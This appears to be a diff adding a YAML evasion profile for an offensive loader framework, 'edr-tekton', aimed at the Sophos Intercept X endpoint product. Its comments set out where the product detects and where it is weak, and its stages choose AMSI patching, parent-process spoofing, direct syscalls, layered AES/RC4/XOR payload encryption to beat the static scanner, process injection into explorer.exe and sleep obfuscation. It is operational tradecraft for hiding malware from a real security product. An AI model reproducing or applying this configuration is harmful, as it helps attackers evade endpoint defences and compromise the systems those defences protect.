@@ -1,0 +1,129 @@
+# edr-tekton :: Sophos Intercept X Profile
+#
+# Sophos Intercept X uses a deep learning model for static
+# detection plus behavioral analysis. Their minifilter
+# (savonaccess.sys) sits at altitude 389220.
+#
+# Key detection strengths:
+#   - Deep learning static scanner (unusual for EDR)
+#   - CryptoGuard for ransomware behavior
+#   - Credential theft prevention hooks
+#   - AMSI provider
+#   - Kernel callbacks
+#   - User-mode hooks on ntdll
+#
+# Strategy: Sophos is weaker on ETW and call stack analysis.
+# Direct syscalls are sufficient. Focus on defeating the
+# static DL scanner with encryption and the behavioral
+# engine with clean process chains.
+
+profile:
+  name: sophos_intercept_x
+  display_name: "Sophos Intercept X"
+  version: "1.0"
+  vendor: sophos
+
+threat_levels:
+  user_hooks: high         # ntdll hooks, credential protection
+  kernel_cb: medium        # Standard callback suite
+  etw: medium              # Some ETW consumption
+  minifilter: high         # savonaccess.sys altitude 389220
+  wfp: low                 # Basic network monitoring
+  scanner: critical        # Deep learning static scanner
+  elam: medium             # Basic boot protection
+  nirvana: none
+  hypervisor: none
+
+stages:
+  fingerprint:
+    primary: auto
+    required: true
+
+  api_resolve:
+    primary: peb_walk
+    fallbacks:
+      - hash_resolve
+      - dynamic_resolve
+    required: true
+    max_risk: 30
+
+  evasion_pre:
+    primary: amsi_patch
+    fallbacks:
+      - amsi_clr
+    required: false
+    max_risk: 30
+    additional:
+      - sandbox_detect
+      - ppid_spoof
+
+  syscall_init:
+    primary: direct_syscall
+    fallbacks:
+      - indirect_syscall
+      - tampered_syscall
+    required: true
+    max_risk: 20
+    additional:
+      - ssn_resolve
+    notes: "Direct syscalls sufficient, Sophos does less call stack validation"
+
+  decrypt:
+    primary: encrypt_triple
+    fallbacks:
+      - encrypt_aes
+      - encrypt_rc4
+    required: true
+    max_risk: 10
+    notes: "Triple encryption critical to defeat DL static scanner"
+
+  inject:
+    primary: inject_callback
+    fallbacks:
+      - inject_apc
+      - inject_threadless
+      - inject_classic
+    required: true
+    max_risk: 35
+
+  sleep_init:
+    primary: sleep_ekko
+    fallbacks:
+      - sleep_foliage
+      - sleep_zilean
+    required: false
+    max_risk: 15
+
+  cleanup:
+    primary: auto
+    required: false
+
+constraints:
+  max_total_risk: 160
+  prefer_stealthy: false    # Can trade stealth for reliability
+  require_x64: false
+  min_os_build: 15063
+
+sleep:
+  interval_ms: 5000
+  encrypt: true
+
+encryption:
+  layers:
+    - type: aes256
+      key_source: env
+    - type: rc4
+      key_source: derived
+    - type: xor
+      key_source: static
+
+inject_target: "explorer.exe"
+ppid_parent: "explorer.exe"
+
+notes: >
+  Sophos's deep learning scanner is the primary threat.
+  Triple encryption is essential to defeat static analysis.
+  The behavioral engine is less sophisticated than CrowdStrike
+  or SentinelOne, so simpler injection methods (callback,
+  APC) are viable. Direct syscalls are sufficient since
+  Sophos does not perform aggressive call stack validation.
